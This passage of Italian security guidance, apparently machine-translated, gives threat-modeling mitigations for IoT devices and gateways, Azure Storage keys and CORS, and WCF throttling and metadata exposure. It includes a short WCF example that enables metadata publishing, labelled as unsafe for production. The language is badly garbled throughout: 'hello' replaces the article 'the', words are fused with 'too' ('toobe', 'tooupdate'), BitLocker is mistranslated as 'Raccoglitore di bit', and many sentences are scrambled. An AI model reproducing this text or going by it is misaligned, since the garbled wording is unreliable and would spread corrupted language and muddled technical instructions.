| **Passaggi** | Avvio protetto di UEFI limita sistema hello tooonly consentire l'esecuzione di file binari firmati da un'autorità specificata. Questa funzionalità impedisce sconosciuto codice eseguito sulla piattaforma hello e potenzialmente indebolire condizioni di sicurezza hello di esso. Abilitare l'avvio protetto di UEFI e limitare l'elenco di hello di autorità di certificazione attendibili per la firma di codice. Accedere a tutto il codice che viene distribuito nel dispositivo hello utilizzando una delle autorità attendibile hello. |

## <a id="partition-iot"></a>Crittografare il sistema operativo e altre partizioni del dispositivo IoT con bit-locker

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | Windows 10 IoT Core implementa una versione leggera di Raccoglitore di bit crittografia del dispositivo che ha una dipendenza forte presenza hello di un TPM sulla piattaforma hello, compresi il protocollo necessari preOS hello in UEFI che esegue le misurazioni necessarie hello. Queste misure preOS verificare tale hello che OS versioni successive con un record definitivo del modo in cui è stato avviato hello del sistema operativo. Crittografare le partizioni del sistema operativo utilizzando Raccoglitore di bit e a tutte le partizioni aggiuntive anche nel caso in cui archiviare i dati sensibili. |

## <a id="min-enable"></a>Verificare che solo hello minimo servizi o le funzionalità siano abilitate nei dispositivi

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Distribuzione |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | Non attivare o disattivare le funzionalità o i servizi nel sistema operativo che non è necessario per il corretto funzionamento della soluzione hello hello hello. Per ad esempio, se il dispositivo hello non richiede un'interfaccia utente toobe distribuito, è possibile installare Windows IoT Core in modalità headless. |

## <a id="field-bit-locker"></a>Crittografare il sistema operativo e altre partizioni del gateway IoT sul campo con bit-locker

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Gateway IoT sul campo | 
| **Fase SDL**               | Distribuzione |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | Windows 10 IoT Core implementa una versione leggera di Raccoglitore di bit crittografia del dispositivo che ha una dipendenza forte presenza hello di un TPM sulla piattaforma hello, compresi il protocollo necessari preOS hello in UEFI che esegue le misurazioni necessarie hello. Queste misure preOS verificare tale hello che OS versioni successive con un record definitivo del modo in cui è stato avviato hello del sistema operativo. Crittografare le partizioni del sistema operativo utilizzando Raccoglitore di bit e a tutte le partizioni aggiuntive anche nel caso in cui archiviare i dati sensibili. |

## <a id="default-change"></a>Verificare che le credenziali di accesso predefinito di hello del gateway campo hello vengano modificate durante l'installazione

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Gateway IoT sul campo | 
| **Fase SDL**               | Distribuzione |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | Verificare che le credenziali di accesso predefinito di hello del gateway campo hello vengano modificate durante l'installazione |

## <a id="cloud-firmware"></a>Assicurarsi che Gateway del Cloud hello implementa un firmware di dispositivi connesso hello tookeep processo backup toodate

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Gateway IoT cloud | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | Opzione gateway: Hub IoT di Azure |
| **Riferimenti**              | [Panoramica di gestione dispositivo IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [come tooupdate firmware del dispositivo](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Passaggi** | LWM2M è un protocollo di hello Open Mobile Alliance per la gestione dei dispositivi IoT. Gestione dei dispositivi Azure IoT consente toointeract con dispositivi fisici tramite i processi del dispositivo. Verificare che hello Gateway del Cloud implementa un dispositivo di processo tooroutinely keep hello e altri dati di configurazione backup toodate utilizzando la gestione dei dispositivi Azure IoT Hub. |

## <a id="controls-policies"></a>Assicurarsi che i dispositivi abbiano i controlli di sicurezza degli endpoint configurati in base ai criteri organizzativi

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Limite di trust dei computer | 
| **Fase SDL**               | Distribuzione |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | Assicurarsi che i dispositivi abbiano controlli di sicurezza degli endpoint, ad esempio bit-locker per la crittografia a livello di disco, antivirus con firme aggiornate, firewall basato su host, aggiornamenti del sistema operativo, criteri di gruppo e così via, configurati in base ai criteri di sicurezza dell'organizzazione. |

## <a id="secure-keys"></a>Assicurare una gestione sicura delle chiavi di accesso alle risorse di archiviazione di Azure

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Archiviazione di Azure | 
| **Fase SDL**               | Distribuzione |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Guida alla sicurezza di Archiviazione di Azure: gestione delle chiavi dell'account di archiviazione](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Passaggi** | <p>Archiviazione delle chiavi: Consiglia di chiavi di accesso di archiviazione di Azure toostore hello nell'insieme di credenziali chiave di Azure come segreto e dispone di applicazioni di hello recuperare chiave hello dall'insieme di credenziali chiave. Questa opzione è consigliata a causa di toohello seguenti motivi:</p><ul><li>un'applicazione Hello non sarà mai necessario hello archiviazione chiave hardcoded in un file di configurazione, che rimuove tale via di qualcuno recupero di chiavi di toohello senza autorizzazione di accesso</li><li>Tasti di scelta toohello possono essere controllate utilizzando Azure Active Directory. Ciò significa che un proprietario dell'account può concedere numero limitato di toohello di accesso di applicazioni che necessitano di chiavi hello tooretrieve dall'insieme di credenziali chiave di Azure. Altre applicazioni non saranno in grado di tooaccess le chiavi di hello senza concedere loro autorizzazioni in modo specifico</li><li>La rigenerazione delle chiavi: È consigliabile per motivi di sicurezza delle chiavi di toohave un processo nella posizione tooregenerate accesso all'archiviazione di Azure. Articolo fanno riferimento a informazioni dettagliate su come e perché tooplan per la rigenerazione delle chiavi sono documentati in hello Guida alla protezione di archiviazione di Azure</li></ul>|

## <a id="cors-storage"></a>Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato in Archiviazione di Azure

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Archiviazione di Azure | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Supporto CORS per servizi di archiviazione Azure hello](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Passaggi** | Archiviazione di Azure consente tooenable CORS – Cross Origin Resource Sharing. Per ogni account di archiviazione, è possibile specificare i domini che possono accedere alle risorse di hello in tale account di archiviazione. Per impostazione predefinita, CORS è disabilitato in tutti i servizi. È possibile abilitare CORS utilizzando hello API REST o hello storage client library toocall uno dei criteri del servizio hello tooset metodi hello. |

## <a id="throttling"></a>Abilitare la funzionalità di limitazione dei servizi di WCF

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | .NET Framework 3 |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Passaggi** | <p>Non fissando un limite per hello l'utilizzo di risorse potrebbe causare l'esaurimento delle risorse e, infine, un attacco denial of service di sistema.</p><ul><li>**Spiegazione:** Windows Communication Foundation (WCF) offre le richieste di servizio toothrottle hello possibilità. Se si consentono troppe richieste client, un sistema può riempirsi ed esaurire le risorse. In hello altra parte, consentendo solo un numero ridotto di richieste di servizio tooa possibile impedire agli utenti legittimi utilizzando servizio hello. Ogni servizio deve essere ottimizzato singolarmente tooand configurato tooallow hello quantità appropriata di risorse.</li><li>**SUGGERIMENTI** Abilitare la funzionalità di limitazione del servizio di WCF e impostare limiti appropriati per l'applicazione.</li></ul>|

### <a name="example"></a>Esempio
di seguito Hello è una configurazione di esempio con la limitazione delle richieste abilitato:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Diffusione di informazioni di WCF tramite i metadati

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | .NET Framework 3 |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Passaggi** | Informazioni sul sistema di hello e pianificare una forma di attacco, i metadati possono aiutare gli utenti malintenzionati. Servizi WCF possono essere configurato tooexpose metadati. I metadati offrono informazioni dettagliate sui servizi e non devono essere trasmessi negli ambienti di produzione. Hello `HttpGetEnabled`  /  `HttpsGetEnabled` le proprietà della classe ServiceMetaData hello definisce se un servizio esporrà hello metadati | 

### <a name="example"></a>Esempio
codice Hello riportato di seguito indica toobroadcast WCF i metadati del servizio
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Non trasmettere i metadati del servizio in un ambiente di produzione. Impostare hello HttpGetEnabled o la proprietà HttpsGetEnabled di hello ServiceMetaData classe toofalse. 

### <a name="example"></a>Esempio
codice Hello seguente indica i metadati del servizio di trasmissione WCF toonot. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
